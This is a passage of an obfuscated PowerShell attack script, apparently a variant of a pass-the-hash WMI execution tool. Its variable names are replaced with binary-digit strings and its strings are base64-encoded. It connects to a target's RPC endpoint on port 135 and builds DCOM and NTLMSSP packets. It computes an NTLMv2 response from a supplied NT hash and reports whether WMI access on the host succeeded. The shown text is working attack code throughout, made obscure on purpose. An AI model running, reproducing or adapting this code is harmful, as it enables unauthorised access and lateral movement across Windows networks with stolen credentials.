    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAbwBjAGEAdABpAG8AbgBJAG4AZgBvAEEAcABhAHIAdABtAGUAbgB0AEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAbwBjAGEAdABpAG8AbgBJAG4AZgBvAEMAbwBuAHQAZQB4AHQASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBDAG8AbQBtAG8AbgBIAGUAYQBkAGUAcgA='))),[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBQAHIAaQB2AGEAdABlAEgAZQBhAGQAZQByAA=='))),[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBOAFUATABMAFAAdAByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBtAG8AdABlAFIAZQBxAHUAZQBzAHQAQwBsAGkAZQBuAHQASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBMAGUAdgBlAGwA'))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBtAG8AdABlAFIAZQBxAHUAZQBzAHQATgB1AG0AUAByAG8AdABvAGMAbwBsAFMAZQBxAHUAZQBuAGMAZQBzAA=='))),[Byte[]](0x01,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBtAG8AdABlAFIAZQBxAHUAZQBzAHQAVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBtAG8AdABlAFIAZQBxAHUAZQBzAHQAUAByAG8AdABvAGMAbwBsAFMAZQBxAHMAQQByAHIAYQB5AFAAdAByAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x04,0x00,0x02,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBtAG8AdABlAFIAZQBxAHUAZQBzAHQAUAByAG8AdABvAGMAbwBsAFMAZQBxAHMAQQByAHIAYQB5AFAAdAByAE0AYQB4AEMAbwB1AG4AdAA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBSAGUAbQBvAHQAZQBSAGUAcQB1AGUAcwB0AFAAdAByAFIAZQBtAG8AdABlAFIAZQBxAHUAZQBzAHQAUAByAG8AdABvAGMAbwBsAFMAZQBxAHMAQQByAHIAYQB5AFAAdAByAFAAcgBvAHQAbwBjAG8AbABTAGUAcQA='))),[Byte[]](0x07,0x00))
    ${10000001001011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAGMAdABQAHIAbwBwAGUAcgB0AGkAZQBzAEMAVQBTAFQATwBNAE8AQgBKAFIARQBGAEkAQQBjAHQAUAByAG8AcABlAHIAdABpAGUAcwBQAHIAbwBwAGUAcgB0AGkAZQBzAFMAYwBtAFIAZQBxAHUAZQBzAHQASQBuAGYAbwBVAG4AdQBzAGUAZABCAHUAZgBmAGUAcgA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))
    return ${10000001001011110}
}
function _01010101100011101
{
    param ([Int]${_10111000101111000},[Byte[]]${_00001011110111111})
    ${00101010111010010} = [System.BitConverter]::ToUInt16(${_00001011110111111}[${_10111000101111000}..(${_10111000101111000} + 1)],0)
    return ${00101010111010010}
}
if($hash -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA'))))
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}
if($Domain)
{
    ${10000001010100110} = $Domain + "\" + $Username
}
else
{
    ${10000001010100110} = $Username
}
if($Target -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAGgAbwBzAHQA'))))
{
    $Target = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA')))
}
try
{
    ${01110111101001011} = [IPAddress]$Target
    ${10101101000101000} = ${10011000101010111} = $Target
}
catch
{
    ${10011000101010111} = $Target
    if($Target -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuACoA'))))
    {
        ${10101100010101100} = $Target.IndexOf(".")
        ${10101101000101000} = $Target.Substring(0,${10101100010101100})
    }
    else
    {
        ${10101101000101000} = $Target
    }
}
${00000101100010100} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
${00000101100010100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${00000101100010100}))
${00000101100010100} = ${00000101100010100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
[Byte[]]${10111010001011001} = ${00000101100010100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgACQAVABhAHIAZwBlAHQAOgAxADMANQA=')))
${10000101011001101} = New-Object System.Net.Sockets.TCPClient
${10000101011001101}.Client.ReceiveTimeout = 30000
try
{
    ${10000101011001101}.Connect($Target,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAzADUA'))))
}
catch
{
    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAFQAYQByAGcAZQB0ACAAZABpAGQAIABuAG8AdAAgAHIAZQBzAHAAbwBuAGQA')))
}
if(${10000101011001101}.Connected)
{
    ${10011111111000011} = ${10000101011001101}.GetStream()
    ${00001011000101101} = New-Object System.Byte[] 2048
    ${01101001110110001} = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
    ${01110101000111010} = _00111000011010000 2 0xd0,0x16 0x02 0x00,0x00 ${01101001110110001} 0x00,0x00
    ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA=')))] = 0x74,0x00    
    ${01010000110101010} = _00011111101010011 ${01110101000111010}
    ${10001000010101111} = ${01010000110101010}
    ${10011111111000011}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
    ${10011111111000011}.Flush()    
    ${10011111111000011}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
    ${10001010100110111} = ${00001011000101101}[20..23]
    ${01110101000111010} = _00001110101011110 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
    ${01010000110101010} = _00011111101010011 ${01110101000111010}
    ${10001000010101111} = ${01010000110101010}
    ${10011111111000011}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
    ${10011111111000011}.Flush()    
    ${10011111111000011}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
    ${00100000000111001} = ${00001011000101101}[42..${00001011000101101}.Length]
    ${10100011001011111} = [System.BitConverter]::ToString(${00100000000111001})
    ${10001001001010101} = ${10100011001011111}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAALQAwADAA'))))
    ${10100011001011111} = ${10100011001011111}.SubString(0,${10001001001010101})
    ${10100011001011111} = ${10100011001011111} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
    ${10100011001011111} = ${10100011001011111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
    ${10100011001011111} = New-Object System.String (${10100011001011111},0,${10100011001011111}.Length)
    if(${10101101000101000} -cne ${10100011001011111})
    {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBNAEkAIAByAGUAcABvAHIAdABzACAAdABhAHIAZwBlAHQAIABoAG8AcwB0AG4AYQBtAGUAIABhAHMAIAAkAHsAMQAwADEAMAAwADAAMQAxADAAMAAxADAAMQAxADEAMQAxAH0A')))
        ${10101101000101000} = ${10100011001011111}
    }
    ${10000101011001101}.Close()
    ${10011111111000011}.Close()
    ${01000011001101101} = New-Object System.Net.Sockets.TCPClient
    ${01000011001101101}.Client.ReceiveTimeout = 30000
    try
    {
        ${01000011001101101}.Connect(${10011000101010111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAzADUA'))))
    }
    catch
    {
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMAAxADAAMQAwADEAMQAxAH0AIABkAGkAZAAgAG4AbwB0ACAAcgBlAHMAcABvAG4AZAA=')))
    }
    if(${01000011001101101}.Connected)
    {
        ${00111101001000001} = ${01000011001101101}.GetStream()
        ${01101001110110001} = 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
        ${01110101000111010} = _00111000011010000 3 0xd0,0x16 0x01 0x01,0x00 ${01101001110110001} 0x00,0x00
        ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA=')))] = 0x78,0x00
        ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA=')))] = 0x28,0x00
        ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA==')))] = 0x07,0x82,0x08,0xa2
        ${01010000110101010} = _00011111101010011 ${01110101000111010}
        ${10001000010101111} = ${01010000110101010}
        ${00111101001000001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
        ${00111101001000001}.Flush()    
        ${00111101001000001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
        ${10001010100110111} = ${00001011000101101}[20..23]
        ${00111011001001001} = [System.BitConverter]::ToString(${00001011000101101})
        ${00111011001001001} = ${00111011001001001} -replace "-",""
        ${10001011001110110} = ${00111011001001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        ${00001110001001001} = ${10001011001110110} / 2
        ${10010101000101110} = _01010101100011101 (${00001110001001001} + 12) ${00001011000101101}
        ${00000111010111010} = _01010101100011101 (${00001110001001001} + 40) ${00001011000101101}
        ${10111110010110011} = ${00001011000101101}[44..51]
        ${10010001001100110} = ${00001011000101101}[(${00001110001001001} + 24)..(${00001110001001001} + 31)]
        ${10100010100001010} = ${00001011000101101}[(${00001110001001001} + 56 + ${10010101000101110})..(${00001110001001001} + 55 + ${10010101000101110} + ${00000111010111010})]
        ${10011110011111011} = ${10100010100001010}[(${10100010100001010}.Length - 12)..(${10100010100001010}.Length - 5)]
        ${00011111100001011} = (&{for (${01110010110000101} = 0;${01110010110000101} -lt $hash.Length;${01110010110000101} += 2){$hash.SubString(${01110010110000101},2)}}) -join "-"
        ${00011111100001011} = ${00011111100001011}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${00010000010011000} = (get-childitem -path env:computername).Value
        ${10101010000011000} = [System.Text.Encoding]::Unicode.GetBytes(${00010000010011000})
        ${00100110101101011} = $Domain
        ${00101100001010101} = [System.Text.Encoding]::Unicode.GetBytes(${00100110101101011})
        ${10010110010010011} = [System.Text.Encoding]::Unicode.GetBytes($username)
        ${01001101010000110} = [System.BitConverter]::GetBytes(${00101100001010101}.Length)[0,1]
        ${01001101010000110} = [System.BitConverter]::GetBytes(${00101100001010101}.Length)[0,1]
        ${00100001010100010} = [System.BitConverter]::GetBytes(${10010110010010011}.Length)[0,1]
        ${01110100010000010} = [System.BitConverter]::GetBytes(${10101010000011000}.Length)[0,1]
        ${01111010011110101} = 0x40,0x00,0x00,0x00
        ${00000011000111100} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + 64)
        ${00010010000100001} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + 64)
        ${01000100101011111} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + ${10101010000011000}.Length + 64)
        ${01001001111101100} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + ${10101010000011000}.Length + 88)
        ${01011100110010101} = New-Object System.Security.Cryptography.HMACMD5
        ${01011100110010101}.key = ${00011111100001011}
        ${10011110010011111} = $username.ToUpper()
        ${10011111011110110} = [System.Text.Encoding]::Unicode.GetBytes(${10011110010011111})
        ${10011111011110110} += ${00101100001010101}
        ${10101111110011000} = ${01011100110010101}.ComputeHash(${10011111011110110})
        ${00000000001101100} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${10110010111010110} = ${00000000001101100}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${01110111100100011} = 0x01,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00 +
                                ${10011110011111011} +
                                ${10110010111010110} +
                                0x00,0x00,0x00,0x00 +
                                ${10100010100001010} +
                                0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00
        ${10011100101111001} = ${10010001001100110} + ${01110111100100011}
        ${01011100110010101}.key = ${10101111110011000}
        ${10010100001101010} = ${01011100110010101}.ComputeHash(${10011100101111001})
        ${01011000010000100} = ${01011100110010101}.ComputeHash(${10010100001101010})
        ${10010100001101010} = ${10010100001101010} + ${01110111100100011}
        ${10101110111110000} = [System.BitConverter]::GetBytes(${10010100001101010}.Length)[0,1]
        ${00000110010000010} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + ${10101010000011000}.Length + ${10010100001101010}.Length + 88)
        ${00010010000110101} = 0x00,0x00
        ${00010110111010010} = 0x15,0x82,0x88,0xa2
        ${01111101001110011} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                0x03,0x00,0x00,0x00,
                                0x18,0x00,
                                0x18,0x00 +
                                ${01000100101011111} +
                                ${10101110111110000} +
                                ${10101110111110000} +
                                ${01001001111101100} +
                                ${01001101010000110} +
                                ${01001101010000110} +
                                ${01111010011110101} +
                                ${00100001010100010} +
                                ${00100001010100010} +
                                ${00000011000111100} +
                                ${01110100010000010} +
                                ${01110100010000010} +
                                ${00010010000100001} +
                                ${00010010000110101} +
                                ${00010010000110101} +
                                ${00000110010000010} +
                                ${00010110111010010} +
                                ${00101100001010101} +
                                ${10010110010010011} +
                                ${10101010000011000} +
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                ${10010100001101010}
        ${10001010100110111} = ${00001011000101101}[20..23]
        ${01110101000111010} = _01111010001111011 ${01111101001110011}
        ${01010000110101010} = _00011111101010011 ${01110101000111010}
        ${10001000010101111} = ${01010000110101010}
        ${00111101001000001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
        ${00111101001000001}.Flush()    
        ${00100110100011000} = [String](1..16 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]${00001101001111011} = ${00100110100011000}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${01011111001110100} = [String](1..16 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]${01111001100001001} = ${01011111001110100}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${10111011000000110} = _10011010100101111 ${00001101001111011} ${10101101000101000}
        ${00101100111011001} = _00011111101010011 ${10111011000000110}
        ${01110101000111010} = _00001110101011110 0x03 ${00101100111011001}.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
        ${01010000110101010} = _00011111101010011 ${01110101000111010}
        ${10001000010101111} = ${01010000110101010} + ${00101100111011001}
        ${00111101001000001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
        ${00111101001000001}.Flush()    
        ${00111101001000001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
        if(${00001011000101101}[2] -eq 3 -and [System.BitConverter]::ToString(${00001011000101101}[24..27]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
        {
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADAAMAAwADAAMAAxADAAMQAwADEAMAAwADEAMQAwAH0AIABXAE0ASQAgAGEAYwBjAGUAcwBzACAAZABlAG4AaQBlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMAAxADAAMQAwADEAMQAxAH0A')))    
        }
        elseif(${00001011000101101}[2] -eq 3)
        {
            ${10011000101100111} = [System.BitConverter]::ToString(${00001011000101101}[27..24])
            ${10011000101100111} = ${10011000101100111} -replace "-",""
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABFAHIAcgBvAHIAIABjAG8AZABlACAAMAB4ACQAewAxADAAMAAxADEAMAAwADAAMQAwADEAMQAwADAAMQAxADEAfQA=')))
        }
        elseif(${00001011000101101}[2] -eq 2 -and !${00011000000111101})
        {
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMQAwADAAMAAwADAAMAAxADAAMQAwADEAMAAwADEAMQAwAH0AIABhAGMAYwBlAHMAcwBlAGQAIABXAE0ASQAgAG8AbgAgACQAewAxADAAMAAxADEAMAAwADAAMQAwADEAMAAxADAAMQAxADEAfQA=')))
        }
        elseif(${00001011000101101}[2] -eq 2)
        {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMQAwADAAMAAwADAAMAAxADAAMQAwADEAMAAwADEAMQAwAH0AIABhAGMAYwBlAHMAcwBlAGQAIABXAE0ASQAgAG8AbgAgACQAewAxADAAMAAxADEAMAAwADAAMQAwADEAMAAxADAAMQAxADEAfQA=')))
            if(${10101101000101000} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA'))))
            {
                ${10101101000101000} = ${00010000010011000}
            }
            ${01101000101001010} = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes(${10101101000101000} + "[")
            ${00000100100101110} = [System.BitConverter]::ToString(${01101000101001010})
            ${00000100100101110} = ${00000100100101110} -replace "-",""
            ${10100011110101111} = [System.BitConverter]::ToString(${00001011000101101})
            ${10100011110101111} = ${10100011110101111} -replace "-",""
            ${01000101110001000} = ${10100011110101111}.IndexOf(${00000100100101110})
            if(${01000101110001000} -lt 1)
            {
                ${00101010010110111} = [System.Net.Dns]::GetHostEntry(${10011000101010111}).AddressList
                ForEach(${00000111010110011} in ${00101010010110111})
                {
                    ${10101101000101000} = ${00000111010110011}.IPAddressToString
                    ${01101000101001010} = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes(${10101101000101000} + "[")
                    ${00000100100101110} = [System.BitConverter]::ToString(${01101000101001010})
                    ${00000100100101110} = ${00000100100101110} -replace "-",""
                    ${01000101110001000} = ${10100011110101111}.IndexOf(${00000100100101110})
                    if(${01000101110001000} -gt 0)
                    {
                        break
                    }
                }
            }
            if(${10011000101010111} -cne ${10101101000101000})
            {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAAkAHsAMQAwADEAMAAxADEAMAAxADAAMAAwADEAMAAxADAAMAAwAH0AIABmAG8AcgAgAHIAYQBuAGQAbwBtACAAcABvAHIAdAAgAGUAeAB0AHIAYQBjAHQAaQBvAG4A')))
            }
            if(${01000101110001000} -gt 0)
            {
                ${10110100100101100} = ${01000101110001000} / 2
                ${01110010110011110} = ${00001011000101101}[(${10110100100101100} + ${01101000101001010}.Length)..(${10110100100101100} + ${01101000101001010}.Length + 8)]
                ${01110010110011110} = [System.BitConverter]::ToString(${01110010110011110})
                ${10000111100101101} = ${01110010110011110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1AEQA'))))
                if(${10000111100101101} -gt 0)
                {
                    ${01110010110011110} = ${01110010110011110}.SubString(0,${10000111100101101})
                }
                ${01110010110011110} = ${01110010110011110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                ${01110010110011110} = ${01110010110011110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                [Int]${10010111110000100} = -join ${01110010110011110} 
                ${01100010010010001} = [System.BitConverter]::ToString(${00001011000101101})
                ${01100010010010001} = ${01100010010010001} -replace "-",""
                ${01100110100101110} = ${01100010010010001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABEADQANQA0AEYANQA3ADAAMQAwADAAMAAwADAAMAAxADgAQQBEADAAOQBGADMANgBBAEQAOABEADAAMQAxAEEAMAA3ADUAMAAwAEMAMAA0AEYAQgA2ADgAOAAyADAA'))))
                ${00100000011110111} = ${01100110100101110} / 2
                ${01110110001000001} = ${00001011000101101}[(${00100000011110111} + 32)..(${00100000011110111} + 39)]
                ${10110001101101001} = ${00001011000101101}[(${00100000011110111} + 48)..(${00100000011110111} + 63)]
                ${01110110001000001} = [System.BitConverter]::ToString(${01110110001000001})
                ${01110110001000001} = ${01110110001000001} -replace "-",""
                ${01010010001011111} = ${01100010010010001}.IndexOf(${01110110001000001},${01100110100101110} + 100)
                ${10000100011011100} = ${01010010001011111} / 2
                ${10111101000010001} = ${00001011000101101}[(${10000100011011100} + 12)..(${10000100011011100} + 27)]
                ${01101110100100101} = New-Object System.Net.Sockets.TCPClient
                ${01101110100100101}.Client.ReceiveTimeout = 30000
            }
            if(${01110010110011110})
            {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAG8AbgBuAGUAYwB0AGkAbgBnACAAdABvACAAJAB7ADEAMAAwADEAMQAwADAAMAAxADAAMQAwADEAMAAxADEAMQB9ADoAJAB7ADEAMAAwADEAMAAxADEAMQAxADEAMAAwADAAMAAxADAAMAB9AA==')))
                try
                {
                    ${01101110100100101}.Connect(${10011000101010111},${10010111110000100})
                }
                catch
                {
                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMAAxADAAMQAwADEAMQAxAH0AOgAkAHsAMQAwADAAMQAwADEAMQAxADEAMQAwADAAMAAwADEAMAAwAH0AIABkAGkAZAAgAG4AbwB0ACAAcgBlAHMAcABvAG4AZAA=')))
                }
            }
            else
            {
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABSAGEAbgBkAG8AbQAgAHAAbwByAHQAIABlAHgAdAByAGEAYwB0AGkAbwBuACAAZgBhAGkAbAB1AHIAZQA=')))
            }
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AbQBlAHQAaABpAG4AZwAgAHcAZQBuAHQAIAB3AHIAbwBuAGcA')))
        }
        if(${01101110100100101}.Connected)
        {
            ${01010111111011001} = ${01101110100100101}.GetStream()
            ${01110101000111010} = _00111000011010000 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA=')))] = 0xd0,0x00
            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA=')))] = 0x28,0x00
            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA')))] = 0x04
